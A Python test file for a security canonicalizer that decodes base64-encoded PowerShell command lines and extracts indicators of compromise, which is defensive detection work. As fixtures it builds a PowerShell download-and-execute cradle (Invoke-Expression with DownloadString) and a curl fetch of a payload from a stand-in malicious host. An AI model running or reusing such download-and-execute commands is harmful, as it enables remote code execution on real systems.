"""Canonicalizer × Decoder-in-Pipeline integration (P0-0 remediation).

Proves the plumbing: canonical evidence now carries decoded_layers[]
+ decoded_iocs[] + decoded_final so ATT&CK / Verdict / Narration
can consume them.
"""
from __future__ import annotations

import base64
from services.canonicalizer import canonicalize, CanonicalCommand


def test_canonicalize_still_returns_expected_shape_on_benign():
    """Additive fields must be present but empty on benign input."""
    cc = canonicalize("dir C:\\Users")
    assert isinstance(cc, CanonicalCommand)
    assert cc.decoded_layers == []
    assert cc.decoded_iocs   == []
    assert cc.decoded_final  == "dir C:\\Users"


def test_canonicalize_wires_decoded_layers_on_powershell_enc():
    inner = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://a.b/c')"
    b64   = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
    cc = canonicalize(f"powershell -NoProfile -EncodedCommand {b64}")
    assert cc.decoded_layers, "expected at least one decoded layer"
    # Every layer must be a canonical CHILD with provenance
    for lyr in cc.decoded_layers:
        prov = lyr["provenance"]
        assert prov["decoded_from"].startswith("canonical:")
        assert prov["attck_promotion"] is False
        assert prov["engine"] == \
            "services.die.preprocessor.recursive_decoder"
    # Decoded final must expose the deobfuscated payload
    assert "DownloadString" in cc.decoded_final
    assert "http://a.b/c" in cc.decoded_final


def test_canonicalize_iocs_carry_provenance_back_to_layer():
    inner = "curl http://malicious.example/payload.exe"
    b64   = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
    cc = canonicalize(f"powershell -Enc {b64}")
    # IOC projection may be empty depending on extractor coverage;
    # if any IOC is surfaced it MUST carry decoded provenance.
    for ioc in cc.decoded_iocs:
        prov = ioc["provenance"]
        assert prov["decoded_from"].startswith("canonical:")
        assert prov["decoded_layer_id"].startswith("canonical:")
        assert prov["attck_promotion"] is False


def test_canonicalize_can_disable_decoder():
    """Back-compat — callers pinned to the old shape can opt out."""
    inner = "Invoke-Expression whoami"
    b64   = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
    cc = canonicalize(f"powershell -Enc {b64}", with_decoder=False)
    assert cc.decoded_layers == []
    assert cc.decoded_iocs   == []
    # Payload / launcher_chain still resolved by the canonicalizer
    assert "powershell" in " ".join(cc.launcher_chain).lower() \
        or cc.effective_command.lower().startswith("powershell")


def test_canonicalize_never_raises_even_if_decoder_faults():
    """Owner invariant: the decoder path must NEVER break
    canonicalisation.  Simulate a fault by mocking the bridge."""
    import services.canonicalizer as mod
    import services.decoder_bridge as bridge

    original = bridge.decode_commandline
    def _boom(*a, **kw):
        raise RuntimeError("simulated decoder crash")
    bridge.decode_commandline = _boom
    try:
        cc = mod.canonicalize("powershell -Enc AAAA")
        assert isinstance(cc, CanonicalCommand)
        assert cc.decoded_layers == []
        assert cc.raw == "powershell -Enc AAAA"
    finally:
        bridge.decode_commandline = original
